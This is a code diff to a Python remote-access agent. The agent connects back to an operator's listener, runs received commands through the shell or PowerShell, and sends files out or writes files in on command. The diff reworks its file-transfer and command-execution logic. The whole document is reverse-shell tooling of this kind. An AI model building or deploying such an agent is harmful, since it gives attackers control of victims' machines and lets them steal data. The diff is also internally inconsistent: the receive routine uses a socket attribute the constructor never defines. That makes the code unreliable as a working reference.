@@ -8,7 +8,7 @@ import json
 class Agent:
     # CONSTRUCTOR METHOD =====
     def __init__(self, listener_ip, listener_port):
-        self.localSocket = socket.socket()
+        self.localSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.bufferSize  = 1024
 
         platformInfo      = platform.uname()
@@ -55,15 +55,15 @@ class Agent:
 
     # SEND FILE =====
     def sendFile(self, file_path):
-        file     = open(file_path, "rb")
-        fileSize = os.path.getsize(file_path)
+        file    = open(file_path, "rb")
+        data    = file.read()
+        dataLen = len(data)
 
-        self.localSocket.send(str(fileSize).encode())
-
-        data = file.read()
+        self.localSocket.send(str(dataLen).encode())
         self.localSocket.sendall(data)
 
-        file.close()
+        completeMsg = self.localSocket.recv(self.bufferSize)
+        if (completeMsg): file.close()
     # END OF sendFile METHOD
 
     # RECEIVE FILE =====
@@ -76,22 +76,26 @@ class Agent:
             elif (self.operatingSys == "Unix")   : destination = filePath.split("/")[-1]
         elif (len(cmd_list) == 3): destination = cmd_list[-1]
 
-        fileSize   = self.localSocket.recv(self.bufferSize).decode()
-        file       = open(destination, "wb")
-        fileBytes  = b""
-        remainSize = int(fileSize)
+        dataSize  = int(self.agentSocket.recv(self.bufferSize).decode())
+        file      = open(destination, "wb")
+        fileBytes = b""
+        buffer    = 1000
         
-        while (0 < remainSize):
-            if (self.bufferSize <= remainSize):
-                fileBytes += self.localSocket.recv(self.bufferSize)
-                remainSize -= self.bufferSize
-            elif (remainSize < self.bufferSize):
-                fileBytes  += self.localSocket.recv(remainSize)
-                remainSize -= remainSize
+        while (len(fileBytes) < dataSize):
+            curBytes    = len(fileBytes)
+            remainBytes = dataSize - curBytes
+
+            if   (buffer <= remainBytes): fileBytes += self.agentSocket.recv(buffer)
+            elif (remainBytes < buffer):  fileBytes += self.agentSocket.recv(remainBytes)
         
         file.write(fileBytes)
         file.close()
-        return f"[+] Agent: File successfully saved to {destination}\n"
+
+        self.agentSocket.send(b"Download completed")
+        print(f"Downloaded {len(fileBytes)} bytes of data")
+        print(f"[+] Agent: File successfully saved to {destination}")
+
+        return
     # END OF recvFile METHOD
 
     # PROCESS COMMAND =====
@@ -117,11 +121,11 @@ class Agent:
             elif (cmdList[0].lower() == "download") and (1 < len(cmdList)):
                 filePath = cmdList[1]
                 self.sendFile(filePath)
-                result = "[+] Server: File transfer complete\n"
+                result = "[+] Agent: File transfer complete\n"
 
             # Receive file and save
             elif (cmdList[0].lower() == "upload") and (1 < len(cmdList)):
-                result = self.recvFile(cmdList)
+                self.recvFile(cmdList)
             
             # Handle blacklist command
             elif (cmd in cmdBlacklist): 
@@ -133,10 +137,10 @@ class Agent:
                     cmdList = ["powershell"] + cmdList
 
                     # Add 'Start-Process' to the beginning of the command when an executable is called to prevent the shell from hanging
-                    if (".exe" in cmd.lower()): cmdList.insert(1, "Start-Process")
+                    if (".exe" in cmdList[0].lower()) or (".exe" in cmdList[1].lower()):
+                        cmdList.insert(1, "Start-Process")
 
                 cmdProcess = subprocess.run(cmdList, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
-
                 returnCode = cmdProcess.returncode
                 output     = cmdProcess.stdout
                 error      = cmdProcess.stderr
@@ -174,8 +178,6 @@ class Agent:
 
                 self.sendData(commandResult)
 
-        except ValueError:
-            print("[!] Data transfer aborted\n")
         except KeyboardInterrupt:
             print("[!] Exiting the program\n")
             self.localSocket.close()
